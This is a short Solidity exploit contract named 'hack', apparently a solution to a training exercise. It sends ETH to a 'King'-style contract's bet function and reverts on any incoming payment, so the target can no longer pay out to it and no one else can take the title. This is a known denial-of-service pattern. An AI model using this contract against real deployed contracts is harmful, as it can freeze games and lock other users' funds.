//SPDX-License-Identifier:MIT
pragma solidity >=0.7.0 <0.9.0;

import "./IKing.sol";

contract hack {
    IKing private king;

    // Constructor para establecer la dirección del contrato Store
    constructor(address _storeAddress) {
        king = IKing(_storeAddress);
    }
    function play () external  payable {
        // IKing contratoAlice = IKing(_addr);
        king.bet{value:msg.value}();
    }
    receive() external payable { 
        revert();
    }

    


}